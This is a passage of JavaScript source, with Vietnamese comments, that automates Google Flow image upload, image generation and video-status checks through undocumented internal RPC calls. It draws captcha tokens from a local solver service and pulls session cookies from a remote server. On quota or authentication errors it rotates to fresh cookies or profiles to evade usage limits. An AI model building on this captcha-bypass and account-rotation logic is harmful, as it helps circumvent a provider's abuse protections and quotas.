  const cleanBytes = imageBytes.includes("base64,") ? imageBytes.split("base64,")[1] : imageBytes;
  const mimeType = bodyObj?.mimeType || (imageBytes.startsWith("data:") ? (imageBytes.match(/^data:([^;]+);/)?.[1] || "image/jpeg") : "image/jpeg");
  const fileName = bodyObj?.fileName || `upload_${Date.now()}.${mimeType.includes("png") ? "png" : "jpg"}`;
  const ctx = normalizeFlowCookie(cookieObj || cookieVal);
  const threadId = bodyObj?.clientContext?.sessionId || bodyObj?.sessionId || "default";

  let tokenUsed = false;
  try {
    await getFlowSession(ctx); // Lấy session và at token trước (nếu cookie 401 sẽ ném lỗi ngay để đổi cookie)

    // Lấy hoặc tạo project Flow thật (dùng chung với video)
    let projectId = await flowGetOrCreateSharedProject(cookieVal, global.flowServerAuthToken);
    if (!projectId && projectIdRaw && isFlowUuid(projectIdRaw)) {
      projectId = String(projectIdRaw).replace(/^projects\//, "").trim();
    }
    if (!projectId) return null;

    const cap = await getVeoCaptchaToken("IMAGE_GENERATION", false, threadId, cookieVal);
    const token = (cap && typeof cap === "object") ? cap.token : (typeof cap === "string" ? cap : null);
    if (!token) throw new Error("Không lấy được captcha IMAGE_GENERATION từ localhost:3000");
    tokenUsed = true;

    const meta1 = flowUpperUuid();
    const meta2 = flowUpperUuid();
    const args = [
      [
        null,
        22,
        null,
        null,
        null,
        projectId,
        null,
        null,
        null,
        null,
        [token, 1]
      ],
      cleanBytes,
      mimeType,
      1,
      null,
      null,
      null,
      null,
      fileName,
      null,
      meta1,
      meta2
    ];

    console.log(`[FlowUpload] Đang upload ảnh qua flow.google.com (maseQ, project: ${projectId})...`);
    const data = await flowBatchExecute(ctx, "maseQ", args, `/project/${projectId}`, { retry: false });

    // Trích xuất mediaId từ kết quả maseQ: data[0][0] là UUID của ảnh
    let mediaId = null;
    if (Array.isArray(data?.[0]) && typeof data[0][0] === "string" && isFlowUuid(data[0][0])) {
      mediaId = data[0][0];
    }
    if (!mediaId && Array.isArray(data?.[1]) && Array.isArray(data[1][3])) {
      const cand = data[1][3][4];
      if (typeof cand === "string" && isFlowUuid(cand)) mediaId = cand;
    }
    if (!mediaId) {
      const uuids = flowFindUuids(data).filter(x => x.toLowerCase() !== projectId.toLowerCase() && x.toUpperCase() !== meta1 && x.toUpperCase() !== meta2);
      if (uuids.length > 0) mediaId = uuids[0];
    }

    if (!mediaId) {
      console.warn("[FlowUpload] maseQ không đọc được mediaId. Raw:", JSON.stringify(data).substring(0, 500));
      // return null; // [ĐÃ TẮT FALLBACK aisandbox-pa.googleapis.com]
      throw new Error("FlowUpload (maseQ) không trả về mediaId.");
    }

    if (cleanBytes) {
      try {
        const bBuf = Buffer.from(cleanBytes, "base64");
        const nImg = he.nativeImage.createFromBuffer(bBuf);
        if (!nImg.isEmpty()) {
          const s = nImg.getSize();
          if (!global.mediaImageSizeCache) global.mediaImageSizeCache = new Map();
          global.mediaImageSizeCache.set(String(mediaId).toLowerCase(), s);
          global.mediaImageSizeCache.set(String(mediaId), s);
        }
      } catch (_) { }
    }

    console.log(`[FlowUpload] Upload ảnh maseQ thành công -> mediaId: ${mediaId}`);
    return {
      mediaId: mediaId,
      media: { name: mediaId },
      mediaGenerationId: { mediaGenerationId: mediaId },
      name: mediaId,
      id: mediaId,
      viaFlow: true
    };
  } catch (err) {
    const errMsg = String(err.message || "");
    if ((global.isSessionStopped && global.isSessionStopped()) || err.name === "AbortError" || errMsg.includes("SESSION_STOPPED")) {
      throw new Error("SESSION_STOPPED");
    }
    const isQuota = err.isQuotaError || err.statusCode === 429 || /429|PUBLIC_ERROR_USER_QUOTA_REACHED|QUOTA_REACHED|RESOURCE_EXHAUSTED|RATE_LIMIT/i.test(errMsg);
    if (isQuota) {
      console.warn(`[FlowUpload] maseQ hết credit Flow (QUOTA_REACHED) -> Ném lỗi 429 để đổi cookie mới!`);
      const quotaErr = new Error("Error 429 - Hết credit tài khoản Google Flow (PUBLIC_ERROR_USER_QUOTA_REACHED)");
      quotaErr.statusCode = 429;
      quotaErr.status = 429;
      quotaErr.isQuotaError = true;
      throw quotaErr;
    }
    const isAuth = err.statusCode === 401 || /401|SNlM0e|hết hạn|unauthenticated|unauthorized/i.test(errMsg);
    if (isAuth) {
      console.warn(`[FlowUpload] maseQ lỗi xác thực Flow (${err.message}) -> Ném lỗi 401 để đổi cookie mới!`);
      const authErr = new Error(`401: Lỗi xác thực tài khoản Flow (${err.message})`);
      authErr.statusCode = 401;
      authErr.status = 401;
      throw authErr;
    }
    /* [ĐÃ TẮT FALLBACK aisandbox-pa.googleapis.com - CHỈ DÙNG FLOW API]
    console.warn(`[FlowUpload] maseQ lỗi (${err.message}) -> chuyển sang API nội bộ backup`);
    return null;
    */
    console.error(`[FlowUpload] maseQ lỗi Flow API:`, err.message);
    throw err;
  } finally {
    if (tokenUsed && threadId && typeof threadTokenCache !== "undefined") threadTokenCache.delete(threadId);
  }
}

// ===== [FLOW IMAGE GENERATION (ogiZ0b)] =====
// Ưu tiên tạo ảnh qua flow.google.com bằng RPC ogiZ0b theo payload_tao_anh.md; nếu lỗi thì chuyển sang API nội bộ backup
async function flowTryGenerateImage(url, cookieObj, body) {
  if (!global.flowVideoEnabled) return null;
  let bodyObj = body;
  if (typeof body === "string") {
    try { bodyObj = JSON.parse(body); } catch (e) { return null; }
  }
  const req = bodyObj?.requests?.[0] || bodyObj;
  const promptText = req?.prompt ||
    req?.structuredPrompt?.parts?.[0]?.text ||
    bodyObj?.prompt ||
    bodyObj?.structuredPrompt?.parts?.[0]?.text ||
    "";
  if (!promptText) {
    console.warn("[FlowImage] Không tìm thấy prompt trong request, chuyển sang API nội bộ backup");
    return null;
  }

  let cookieVal = cookieObj && typeof cookieObj === "object" ? cookieObj.value || cookieObj.cookie : typeof cookieObj === "string" ? cookieObj : null;
  if (!cookieVal) {
    // Không có cookie local kích hoạt -> tự động lấy cookie server
    try {
      const serverCtx = await fetchFlowCookieFromServer(global.flowServerAuthToken, false);
      if (serverCtx && serverCtx.value) cookieVal = serverCtx.value;
    } catch (e) { }
  }
  if (!cookieVal) return null;

  const ctx = normalizeFlowCookie(cookieObj || cookieVal);
  try {
    await getFlowSession(ctx); // Kiểm tra session trước để phát hiện ngay cookie 401
  } catch (sessErr) {
    const sMsg = String(sessErr.message || "");
    if (sessErr.statusCode === 401 || /401|SNlM0e|hết hạn|unauthenticated|unauthorized/i.test(sMsg)) {
      console.warn(`[FlowImage] Cookie Flow hết hạn (${sMsg}) -> Ném lỗi 401 để đổi cookie mới!`);
      const authErr = new Error(`401: Lỗi xác thực tài khoản Flow (${sMsg})`);
      authErr.statusCode = 401;
      authErr.status = 401;
      throw authErr;
    }
  }

  // Lấy hoặc tạo project Flow thật (dùng chung với tạo video), KHÔNG dùng UUID giả ngẫu nhiên từ client
  let projectId = await flowGetOrCreateSharedProject(cookieVal, global.flowServerAuthToken);
  if (!projectId) {
    if (url) {
      const m = url.match(/projects\/([^\/]+)/);
      if (m && isFlowUuid(m[1])) projectId = m[1];
    }
  }
  if (!projectId) {
    console.warn("[FlowImage] Không có project Flow hợp lệ -> chuyển sang API nội bộ backup");
    return null;
  }

  // Model: HARBOR_SEAL (lite 2 / narwhal), BELUGA (pro 2), GEM_PIX_2 (banana pro)
  let modelName = "GEM_PIX_2";
  const reqModel = String(req?.imageModelName || bodyObj?.imageModelName || req?.model || bodyObj?.model || "").toUpperCase();
  if (reqModel.includes("HARBOR") || reqModel.includes("SEAL") || reqModel.includes("LITE") || reqModel.includes("NARWHAL")) {
    modelName = "HARBOR_SEAL";
  } else if (reqModel.includes("BELUGA") || reqModel.includes("PRO 2") || reqModel.includes("PRO_2") || reqModel.includes("PRO2")) {
    modelName = "BELUGA";
  } else if (reqModel.includes("GEM_PIX") || reqModel.includes("BANANA")) {
    modelName = "GEM_PIX_2";
  }

  // Aspect ratio cho Flow ogiZ0b: 1 = 1:1 (Vuông), 2 = 9:16 (Dọc / Portrait), 3 = 16:9 (Ngang / Landscape)
  let aspectCode = 3; // Mặc định 16:9 (Ngang)
  const reqAspect = String(req?.imageAspectRatio || req?.aspectRatio || bodyObj?.imageAspectRatio || bodyObj?.aspectRatio || "").toUpperCase();
  if (reqAspect.includes("PORTRAIT") || reqAspect.includes("9:16") || reqAspect.includes("9_16") || reqAspect.includes("DOC") || reqAspect === "2") {
    aspectCode = 2; // DỌC (9:16)
  } else if (reqAspect.includes("LANDSCAPE") || reqAspect.includes("16:9") || reqAspect.includes("16_9") || reqAspect.includes("NGANG") || reqAspect === "3") {
    aspectCode = 3; // NGANG (16:9)
  } else if (reqAspect.includes("SQUARE") || reqAspect.includes("1:1") || reqAspect.includes("VUONG") || reqAspect === "1") {
    aspectCode = 1; // VUÔNG (1:1)
  }

  const seed = Number.isInteger(req?.seed) && req.seed > 0 ? req.seed : Math.floor(Math.random() * 2147483647);
  const threadId = bodyObj?.clientContext?.sessionId || bodyObj?.sessionId || "default";

  // [ẢNH THAM CHIẾU / REFERENCE IMAGES]
  // Trích xuất danh sách ảnh tham chiếu từ request (theo payload_tao_anh.md dòng 47)
  const rawInputs = req?.imageInputs ||
    bodyObj?.imageInputs ||
    req?.referenceImages ||
    bodyObj?.referenceImages ||
    req?.referenceImageIds ||
    bodyObj?.referenceImageIds ||
    req?.imageInputsList ||
    (req?.imageInput ? [req.imageInput] : null) ||
    (bodyObj?.imageInput ? [bodyObj.imageInput] : null) ||
    (req?.imageInputBase64 ? [req.imageInputBase64] : null) ||
    (bodyObj?.imageInputBase64 ? [bodyObj.imageInputBase64] : null) ||
    (req?.imageBase64 ? [req.imageBase64] : null) ||
    (bodyObj?.imageBase64 ? [bodyObj.imageBase64] : null) ||
    [];

  const inputList = Array.isArray(rawInputs) ? rawInputs : [rawInputs];
  const refImageIds = [];

  for (const item of inputList) {
    if (!item) continue;
    let refId = null;
    let base64Data = null;

    if (typeof item === "string") {
      const trimmed = item.trim();
      if (isFlowUuid(trimmed)) {
        refId = trimmed;
      } else if (trimmed.startsWith("data:image/") || (trimmed.length > 100 && !trimmed.startsWith("http"))) {
        base64Data = trimmed;
      }
    } else if (typeof item === "object") {
      const cand = item.name || item.mediaId || item.id || item.mediaGenerationId?.mediaGenerationId || item.media?.name;
      if (typeof cand === "string") {
        const trimmed = cand.trim();
        if (isFlowUuid(trimmed)) {
          refId = trimmed;
        } else if (trimmed.startsWith("data:image/") || (trimmed.length > 100 && !trimmed.startsWith("http"))) {
          base64Data = trimmed;
        }
      }
      if (!refId && !base64Data) {
        const b64 = item.imageBytes || item.rawBytes || item.base64;
        if (b64 && typeof b64 === "string") {
          base64Data = b64;
        }
      }
    }

    // Nếu ảnh tham chiếu là dạng base64 chưa upload lên Flow -> tự upload qua maseQ để lấy mediaId Flow
    if (!refId && base64Data) {
      try {
        console.log(`[FlowImage] Đang tải ảnh tham chiếu lên Flow (maseQ, project: ${projectId})...`);
        const upRes = await flowTryUploadImage(`/projects/${projectId}/uploadImage`, cookieObj || cookieVal, {
          projectId,
          clientContext: { projectId, sessionId: threadId },
          imageBytes: base64Data
        });
        if (upRes && upRes.mediaId) {
          refId = upRes.mediaId;
          console.log(`[FlowImage] Tải ảnh tham chiếu lên Flow thành công -> mediaId: ${refId}`);
        }
      } catch (upErr) {
        if (upErr.statusCode === 401 || upErr.statusCode === 429 || upErr.isQuotaError) throw upErr;
        console.warn(`[FlowImage] Lỗi khi upload ảnh tham chiếu:`, upErr.message);
      }
    }

    if (refId && isFlowUuid(refId) && !refImageIds.includes(refId)) {
      refImageIds.push(refId);
    }
  }

  // Cấu trúc ảnh tham chiếu cho Flow ogiZ0b theo payload_tao_anh.md dòng 47:
  // [[mediaId, null, null, null, 1], ...] hoặc null nếu không có ảnh tham chiếu
  const refImagesPayload = refImageIds.length > 0
    ? refImageIds.map(id => [id, null, null, null, 1])
    : null;

  let tokenUsed = false;
  try {
    await getFlowSession(ctx); // Lấy session và at token trước
    const cap = await getVeoCaptchaToken("IMAGE_GENERATION", false, threadId, cookieVal);
    const token = (cap && typeof cap === "object") ? cap.token : (typeof cap === "string" ? cap : null);
    if (!token) throw new Error("Không lấy được captcha IMAGE_GENERATION từ localhost:3000");
    tokenUsed = true;

    const u1 = flowUpperUuid();
    const u2 = flowUpperUuid();
    const u3 = flowUpperUuid();
    const clientContext = [null, 22, null, null, null, projectId, null, null, null, null, [token, 1]];

    const reqItem = [
      null,
      null,
      refImagesPayload,
      seed,
      aspectCode,
      modelName,
      null,
      clientContext,
      [[[promptText]]],
      null,
      null,
      null,
      u1,
      u2
    ];

    const args = [
      null,
      [reqItem],
      1,
      clientContext,
      [u3]
    ];

    console.log(`[FlowImage] Đang tạo ảnh qua flow.google.com (ogiZ0b, model: ${modelName}, aspect: ${aspectCode}, project: ${projectId}, refImages: ${refImageIds.length > 0 ? JSON.stringify(refImageIds) : "none"})...`);
    const data = await flowBatchExecute(ctx, "ogiZ0b", args, `/project/${projectId}`, { retry: false });

    // Trích xuất mediaId và hình ảnh từ kết quả
    let imageUrl = flowPickMediaUrl(data, "image") || flowPickMediaUrl(data, "any");
    let b64 = null;

    const findBase64 = (v) => {
      if (typeof v === "string") {
        if (v.startsWith("data:image/") || (v.length > 1000 && !v.includes(" ") && !v.startsWith("http"))) {
          b64 = v.replace(/^data:image\/\w+;base64,/, "");
        }
      } else if (Array.isArray(v)) {
        for (const item of v) {
          if (b64) break;
          findBase64(item);
        }
      } else if (v && typeof v === "object") {
        for (const k of Object.keys(v)) {
          if (b64) break;
          findBase64(v[k]);
        }
      }
    };
    findBase64(data);

    const uuids = flowFindUuids(data).filter(x =>
      x.toLowerCase() !== projectId.toLowerCase() &&
      x.toUpperCase() !== u1 &&
      x.toUpperCase() !== u2 &&
      x.toUpperCase() !== u3
    );
    let mediaId = uuids[0] || flowUpperUuid();

    // Nếu chưa có imageUrl và chưa có b64, nhưng có mediaId -> thử lấy URL qua as29s
    if (!imageUrl && !b64 && mediaId) {
      try {
        imageUrl = await flowGetMediaUrl(mediaId, { cookieHint: cookieVal, projectId, onlyVideo: false });
      } catch (e) {
        console.warn(`[FlowImage] flowGetMediaUrl(${mediaId}) lỗi:`, e.message);
      }
    }

    // Nếu có imageUrl mà chưa có b64 -> fetch tải ảnh về chuyển thành base64 cho callers
    if (imageUrl && !b64) {
      try {
        const fetchFn = global.fetch || require("node-fetch");
        const imgFetch = await fetchFn(imageUrl);
        if (imgFetch.ok) {
          const imgBuffer = await imgFetch.arrayBuffer();
          b64 = Buffer.from(imgBuffer).toString("base64");
        }
      } catch (err) {
        console.warn(`[FlowImage] Không thể tải dữ liệu ảnh từ URL ${imageUrl}:`, err.message);
      }
    }

    if (!b64 && !imageUrl) {
      console.warn("[FlowImage] ogiZ0b không trích xuất được ảnh hoặc URL. Raw:", JSON.stringify(data).substring(0, 500));
      const rawStr = JSON.stringify(data) || "";
      if (rawStr.includes("PUBLIC_ERROR_USER_QUOTA_REACHED") || rawStr.includes("QUOTA_REACHED") || rawStr.includes("RESOURCE_EXHAUSTED") || rawStr.includes("RATE_LIMIT")) {
        console.warn(`[FlowImage] ogiZ0b phát hiện tài khoản hết credit (PUBLIC_ERROR_USER_QUOTA_REACHED). Ném lỗi 429 để đổi cookie mới!`);
        const quotaErr = new Error("Error 429 - Hết credit tài khoản Google Flow (PUBLIC_ERROR_USER_QUOTA_REACHED)");
        quotaErr.statusCode = 429;
        quotaErr.status = 429;
        quotaErr.isQuotaError = true;
        throw quotaErr;
      }
      console.warn("[FlowImage] ogiZ0b không trích xuất được ảnh hoặc URL. Raw:", rawStr.substring(0, 500));
      // return null; // [ĐÃ TẮT FALLBACK aisandbox-pa.googleapis.com]
      throw new Error("FlowImage (ogiZ0b) không trả về dữ liệu ảnh.");
    }

    console.log(`[FlowImage] Tạo ảnh ogiZ0b thành công -> mediaId: ${mediaId}, b64 len: ${b64 ? b64.length : 0}, url: ${imageUrl || "none"}`);
    return {
      media: [
        {
          name: mediaId,
          mediaGenerationId: { mediaGenerationId: mediaId },
          image: {
            fifeUrl: imageUrl || "",
            encodedImage: b64 || "",
            generatedImage: {
              fifeUrl: imageUrl || "",
              encodedImage: b64 || ""
            }
          }
        }
      ],
      viaFlow: true
    };
  } catch (err) {
    const errMsg = String(err.message || "");
    if ((global.isSessionStopped && global.isSessionStopped()) || err.name === "AbortError" || errMsg.includes("SESSION_STOPPED")) {
      throw new Error("SESSION_STOPPED");
    }
    const isQuota = err.isQuotaError || err.statusCode === 429 || /429|PUBLIC_ERROR_USER_QUOTA_REACHED|QUOTA_REACHED|RESOURCE_EXHAUSTED|RATE_LIMIT/i.test(errMsg);
    if (isQuota) {
      console.warn(`[FlowImage] ogiZ0b hết credit Flow (QUOTA_REACHED) -> Ném lỗi 429 để hệ thống tự động đổi profile!`);
      const quotaErr = new Error("Error 429 - Hết credit tài khoản Google Flow (PUBLIC_ERROR_USER_QUOTA_REACHED)");
      quotaErr.statusCode = 429;
      quotaErr.status = 429;
      quotaErr.isQuotaError = true;
      throw quotaErr;
    }
    const isAuth = err.statusCode === 401 || errMsg.includes("SNlM0e") || errMsg.includes("401") || errMsg.includes("hết hạn") || errMsg.includes("unauthenticated");
    if (isAuth) {
      console.warn(`[FlowImage] ogiZ0b lỗi xác thực Flow (${err.message}) -> Ném lỗi 401 để đổi cookie mới!`);
      const authErr = new Error(`401: Lỗi xác thực tài khoản Flow (${err.message})`);
      authErr.statusCode = 401;
      authErr.status = 401;
      throw authErr;
    }
    /* [ĐÃ TẮT FALLBACK aisandbox-pa.googleapis.com - CHỈ DÙNG FLOW API]
    console.warn(`[FlowImage] ogiZ0b lỗi (${err.message}) -> chuyển sang API nội bộ backup`);
    return null;
    */
    console.error(`[FlowImage] ogiZ0b lỗi Flow API:`, err.message);
    throw err;
  } finally {
    if (tokenUsed && threadId && typeof threadTokenCache !== "undefined") {
      threadTokenCache.delete(threadId);
    }
  }
}


// ===== [FLOW VIDEO STATUS CHECK (as29s + jwpduf) - 20 GIÂY / LẦN] =====
// CHỈ áp dụng cho video tạo từ flow.google.com, KHÔNG áp dụng và KHÔNG sửa API nội bộ.
global.flowTrackedVideos = global.flowTrackedVideos || new Map();
global.flowTrackedProjects = global.flowTrackedProjects || new Map();
global.flowClaimedMediaIds = global.flowClaimedMediaIds || new Set();
global.flowClaimedVideoUrls = global.flowClaimedVideoUrls || new Set();

function flowRegisterCreatedVideo(res, projectId, cookieVal, inputMediaIds = []) {
  if (!res || !projectId) return;
  const cleanProj = String(projectId).toLowerCase().replace(/^projects\//, "").trim();
  const inputSet = new Set((inputMediaIds || []).filter(Boolean).map(x => String(x).toLowerCase().trim()));
  const candIds = Array.isArray(res.candIds) ? res.candIds : [];
  const primaryMediaId = res.mediaId || res.media?.[0]?.mediaId || null;
  const task = {
    projectId: cleanProj,
    cookieVal,
    createdAt: Date.now(),
    lastCheckTime: Date.now(),
    completed: false,
    mediaId: primaryMediaId,
    videoUrl: null,
    inputMediaIds: inputSet,
    candIds: [...new Set([primaryMediaId, ...candIds].filter(Boolean))],
  };
  // Không map 1-1 projectId để tránh ghi đè đa luồng trong cùng project
  if (primaryMediaId) {
    global.flowTrackedVideos.set(String(primaryMediaId).toLowerCase().trim(), task);
  }
  for (const cid of task.candIds) {
    global.flowTrackedVideos.set(String(cid).toLowerCase().trim(), task);
  }
  if (res.media) {
    for (const m of res.media) {
      if (m && m.name) {
        task.name = task.name || m.name;
        global.flowTrackedVideos.set(String(m.name).toLowerCase().trim(), task);
      }
      if (m && m.sceneId) {
        global.flowTrackedVideos.set(String(m.sceneId).toLowerCase().trim(), task);
      }
      if (m && m.workflowId) {
        global.flowTrackedVideos.set(String(m.workflowId).toLowerCase().trim(), task);
      }
      if (m && m.mediaId) {
        global.flowTrackedVideos.set(String(m.mediaId).toLowerCase().trim(), task);
      }
    }
  }
  if (res.workflows) {
    for (const w of res.workflows) {
      if (w && w.name) {
        global.flowTrackedVideos.set(String(w.name).toLowerCase().trim(), task);
      }
    }
  }
  console.log(`[FlowCheck] Đã ghi nhận video Flow (project: ${cleanProj}, mediaId: ${primaryMediaId || "chờ check"}). Sẽ check định kỳ 30s.`);
}

function flowFormatCheckInProgress(opName) {
  return {
    media: [
      {
        name: opName,
        status: "MEDIA_GENERATION_STATUS_IN_PROGRESS",
      },
    ],
  };
}

function flowFormatCheckSuccess(opName, mediaId, videoUrl) {
  return {
    media: [
      {
        name: opName,
        status: "MEDIA_GENERATION_STATUS_SUCCESSFUL",
        mediaGenerationId: mediaId,
        video: {
          fifeUrl: videoUrl,
          servingBaseUri: videoUrl,
          mediaGenerationId: mediaId,
          generatedVideo: {
            fifeUrl: videoUrl,
            servingBaseUri: videoUrl,
            mediaGenerationId: mediaId,
          },
        },
        operation: {
          name: opName,
          metadata: {
            video: {
              fifeUrl: videoUrl,
              servingBaseUri: videoUrl,
              mediaGenerationId: mediaId,
            },
          },
        },
      },
    ],
  };
}

function flowFormatCheckFailed(opName, errorMsg = "Lỗi Veo API (FAILED): Vi phạm chính sách.") {
  return {
    media: [
      {
        name: opName,
        status: "MEDIA_GENERATION_STATUS_FAILED",
        error: {
          code: 400,
          message: errorMsg,
        },
        mediaStatus: {
          mediaGenerationStatus: "MEDIA_GENERATION_STATUS_FAILED",
          statusDetail: errorMsg,
        },
      },
    ],
  };
}

async function flowCheckVideoStatus(task, opName, projectId, cookieHint) {
  if (global.isSessionStopped && global.isSessionStopped()) {
    throw new Error("SESSION_STOPPED");
  }
  // 0. Nếu đã hoàn thành trước đó (cache), trả kết quả ngay
  if (task.completed && task.videoUrl) {
    return flowFormatCheckSuccess(opName, task.mediaId, task.videoUrl);
  }
  if (task.failed) {
    return flowFormatCheckFailed(opName, task.failReason || "Lỗi Veo API (FAILED): Vi phạm chính sách.");
  }

  task.checkCount = (task.checkCount || 0) + 1;

  // 1. Đúng chu kỳ 20 giây 1 lần giữa các lần gọi kiểm tra
  const now = Date.now();
  const elapsed = now - (task.lastCheckTime || task.createdAt || 0);
  const waitMs = 20000 - elapsed;
  if (waitMs > 0) {
    console.log(`[FlowCheck] Đợi ${Math.round(waitMs / 1000)}s cho đủ chu kỳ 20s trước khi kiểm tra video (project: ${projectId})...`);
    if (typeof cancellableSleep === "function") {
      await cancellableSleep(waitMs);
    } else {
      await new Promise((r) => setTimeout(r, waitMs));
    }
  }
  if (global.isSessionStopped && global.isSessionStopped()) {
    throw new Error("SESSION_STOPPED");
  }
  task.lastCheckTime = Date.now();

  // 2. Chuẩn bị cookie Flow hợp lệ
  const cookieVal = (cookieHint && typeof cookieHint === "object" ? cookieHint.value || cookieHint.cookie : cookieHint) || task.cookieVal;
  let ctx = null;
  try {
    const cookies = await flowResolveCookies(cookieVal, global.flowServerAuthToken, false);
    ctx = cookies[0];
  } catch (e) { }
  if (!ctx && cookieVal) ctx = normalizeFlowCookie(cookieVal);

  if (!ctx) {
    console.warn("[FlowCheck] Không có cookie Flow để kiểm tra trạng thái");
    return flowFormatCheckInProgress(opName);
  }

  // 3. Tập hợp danh sách candidate mediaId để kiểm tra
  const candidates = [];
  const pushCand = (id) => {
    if (!id || typeof id !== "string") return;
    const clean = id.toLowerCase().trim();
    if (!isFlowUuid(clean)) return;
    if (clean === String(projectId).toLowerCase().trim()) return;
    if (task.inputMediaIds?.has(clean)) return;
    // Tuyệt đối không nhận candidate đã thuộc task khác hoàn thành
    if (global.flowClaimedMediaIds.has(clean) && clean !== task.mediaId) return;
    const existingTask = global.flowTrackedVideos?.get(clean);
    if (existingTask && existingTask !== task) return;
    if (!candidates.includes(clean)) candidates.push(clean);
  };

  pushCand(task.mediaId);
  if (Array.isArray(task.candIds)) {
    for (const cid of task.candIds) pushCand(cid);
  }
  pushCand(opName);
  pushCand(task.name);

  console.log(`[FlowCheck] Kiểm tra trạng thái video (project: ${projectId}, candidates: ${candidates.join(", ")})...`);

  // 4. Bước 1: Thử lấy link video trực tiếp qua as29s cho các candidate của chính task này
  let mediaId = null;
  let videoUrl = null;
  for (const cand of candidates) {
    try {
      const u = await flowGetMediaUrl(cand, { cookieHint: ctx, projectId, onlyVideo: true });
      if (u && u.includes("flow-content.google/video/")) {
        const baseUrl = u.split("?")[0];
        if (global.flowClaimedVideoUrls.has(baseUrl) && task.videoUrl !== u) {
          console.warn(`[FlowCheck] Video URL ${baseUrl} đã thuộc luồng khác, bỏ qua.`);
          continue;
        }
        mediaId = cand;
        videoUrl = u;
        break;
      }
    } catch (err) { }
  }

  // 5. Bước 2: Nếu chưa có URL trực tiếp, dùng RPC jwpduf để kiểm tra chi tiết trạng thái media
  if (!videoUrl) {
    for (const cand of candidates) {
      try {
        const jRes = await flowBatchExecute(ctx, "jwpduf", [null, null, [[cand]]], `/project/${projectId}`, { retry: false });
        const jResStr = JSON.stringify(jRes || "").toUpperCase();
        if (jResStr.includes("SAFETY") || jResStr.includes("FILTER") || jResStr.includes("VIOLAT") || jResStr.includes("BLOCKED")) {
          console.error(`[FlowCheck] jwpduf phát hiện vi phạm chính sách an toàn cho candidate ${cand}`);
          task.failed = true;
          task.failReason = "Lỗi Veo API (FAILED): Vi phạm bộ lọc an toàn của Google (Safety Filtered).";
          return flowFormatCheckFailed(opName, task.failReason);
        }
        const item = jRes?.[2]?.[0];
        if (item && item[0] === cand && item[1] === projectId) {
          task.mediaId = cand; // Xác nhận ID này chính là media video của Flow
          const candUrl = flowPickMediaUrl(jRes);
          if (candUrl && candUrl.includes("flow-content.google/video/")) {
            const baseUrl = candUrl.split("?")[0];
            if (!global.flowClaimedVideoUrls.has(baseUrl) || task.videoUrl === candUrl) {
              mediaId = cand;
              videoUrl = candUrl;
              break;
            }
          }
          const asUrl = await flowGetMediaUrl(cand, { cookieHint: ctx, projectId, onlyVideo: true });
          if (asUrl && asUrl.includes("flow-content.google/video/")) {
            const baseUrl = asUrl.split("?")[0];
            if (!global.flowClaimedVideoUrls.has(baseUrl) || task.videoUrl === asUrl) {
              mediaId = cand;
              videoUrl = asUrl;
              break;
            }
          }
        }
      } catch (err) { }
    }
  }

  // Bước 3: ĐÃ BỎ hoàn toàn quét ngNC2 tự do để tránh các luồng song song cướp video của nhau trong cùng 1 project!

  // Chưa có link video -> kiểm tra xem có vượt quá số lần/thời gian tối đa không
  if (!videoUrl) {
    const ageSec = Math.round((Date.now() - (task.createdAt || Date.now())) / 1000);
    // Nếu kiểm tra quá 6 lần (~120s) hoặc quá 130s mà không có video -> xác nhận video thất bại / vi phạm chính sách
    if (task.checkCount >= 6 || ageSec >= 130) {
      console.error(`[FlowCheck] Video project ${projectId} (mediaId: ${task.mediaId || opName}) không có URL sau ${task.checkCount} lần kiểm tra (${ageSec}s) -> Xác nhận thất bại / vi phạm chính sách (Filtered).`);
      task.failed = true;
      task.failReason = "Lỗi Veo API (FAILED): Vi phạm chính sách an toàn của Google (Filtered) hoặc video bị hủy.";
      return flowFormatCheckFailed(opName, task.failReason);
    }
    console.log(`[FlowCheck] Video project ${projectId} (mediaId: ${task.mediaId || "chờ hoàn tất"}) đang xử lý (lần ${task.checkCount}/6, ${ageSec}s)...`);
    return flowFormatCheckInProgress(opName);
  }

  console.log(`[FlowCheck] Đã lấy link video thành công qua as29s (mediaId: ${mediaId}): ${videoUrl.substring(0, 80)}...`);
  task.completed = true;
  task.mediaId = mediaId;
  task.videoUrl = videoUrl;

  if (mediaId) {
    const cleanMedia = String(mediaId).toLowerCase().trim();
    global.flowClaimedMediaIds.add(cleanMedia);
    global.flowTrackedVideos.set(cleanMedia, task);
  }
  if (videoUrl) {
    global.flowClaimedVideoUrls.add(videoUrl.split("?")[0]);
  }

  return flowFormatCheckSuccess(opName, mediaId, videoUrl);
}


async function flowTryCheckVideoStatus(cookieObj, body) {
  let bodyObj = body;
  if (typeof body === "string") {
    try { bodyObj = JSON.parse(body); } catch (e) { return null; }
  }
  const item = bodyObj?.media?.[0];
  const opName = item?.name;
  const pIdRaw = item?.projectId;
  const pId = pIdRaw ? String(pIdRaw).replace(/^projects\//, "") : null;

  let task = null;
  if (opName) {
    const key = String(opName).toLowerCase().trim();
    if (global.flowTrackedVideos?.has(key)) task = global.flowTrackedVideos.get(key);
  }

  // KHÔNG dùng fallback theo projectId vì nhiều luồng chạy chung 1 project sẽ gây cướp video của nhau!
  if (!task) {
    // return null; // [ĐÃ TẮT FALLBACK aisandbox-pa.googleapis.com]
    return flowFormatCheckFailed(opName || "unknown", "Không tìm thấy tiến trình video trên Flow RPC.");
  }

  return await flowCheckVideoStatus(task, opName || task.name, pId || task.projectId, cookieObj);
}
// ===== [END FLOW VIDEO] =====
// ===== [END FLOW RPC] =====

// HÀM LẤY TOKEN (CÓ CƠ CHẾ XẾP HÀNG & CACHE & ISOLATION)
async function getVeoCaptchaToken(action, force = false, threadId = "default", cookieString = null) {
  if (global.isSessionStopped && global.isSessionStopped()) {
    return null;
  }
  // 1. Kiểm tra Cache theo ThreadId (Nếu token chưa hết hạn thì dùng luôn)
  const now = Date.now();
  const cached = threadTokenCache.get(threadId);
  if (!force && cached && now < cached.expiry) {
    console.log(`[Main] [Thread-${threadId}] Sử dụng Token từ Cache.`);
    return cached;
  }

  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 300000); // 5 phút timeout
  const sessionCtrl = global.currentAbortController;
  const onSessionAbort = () => { try { controller.abort(); } catch (_) { } };
  if (sessionCtrl) {
    if (sessionCtrl.signal.aborted) {
      clearTimeout(timeoutId);
      return null;
    }
    sessionCtrl.signal.addEventListener("abort", onSessionAbort, { once: true });
  }

  try {
    console.log(`[Main] [Thread-${threadId}] Đang gọi API lấy Token (Action: ${action || "FLOW_GENERATION"})...`);

    const url = new URL('http://localhost:3000/captcha');
    url.searchParams.append('action', action || 'VIDEO_GENERATION');
    if (threadId) {
